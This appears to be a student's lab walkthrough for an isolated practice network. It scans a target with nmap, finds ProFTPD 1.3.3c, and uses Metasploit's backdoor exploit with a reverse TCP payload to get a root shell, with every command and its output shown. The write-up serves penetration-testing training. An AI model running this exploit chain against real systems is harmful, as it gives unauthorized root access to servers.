# Steps for lab 2

## Step 1 - Search for exploits on target

```bash
nmap -sC -sV 10.5.0.254
```

```markdown
PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.3c
80/tcp open  http    Apache httpd 2.4.10 ((Debian) PHP/5.5.29)
|_http-server-header: Apache/2.4.10 (Debian) PHP/5.5.29
|_http-title: exploit.co.il : Articles : Tutorials : Reviews : Videos
```

## Step 2 - Use msfconsole

```bash
msfconsole
```

### Step 2.1: Search by service running

```bash
search ProFTPD
use 5
set RHOSTS 10.5.0.254
run
```

```markdown
[-] 10.5.0.254:21 - Exploit failed: A payload has not been selected.
[*] Exploit completed, but no session was created.
```

### Step 2.2: Check local host IP

```bash
ifconfig
```

```markdown
eth-lab: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.5.0.1  netmask 255.255.255.0  broadcast 0.0.0.0
```

### Step 2.3: Try payload one by one

```bash
show payloads
set payload 5
set LHOST 10.5.0.1
run
```

```markdown
[*] Started reverse TCP handler on 10.5.0.1:4444
[*] 10.5.0.254:21 - Sending Backdoor Command
[*] Command shell session 1 opened (10.5.0.1:4444 -> 10.5.1.11:46394) at 2023-03-27 03:40:12 +0000
```

## Step 3 - Now you are in the target machine

```bash
whoami
```

```markdown
root
```

```bash
ls
```

```markdown
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
proftpd-1.3.3c
root
run
sbin
srv
sys
tmp
usr
var
```

## Terminal output

- [tmux session 1](tmux1.txt)

- [tmux session 2](tmux2.txt)
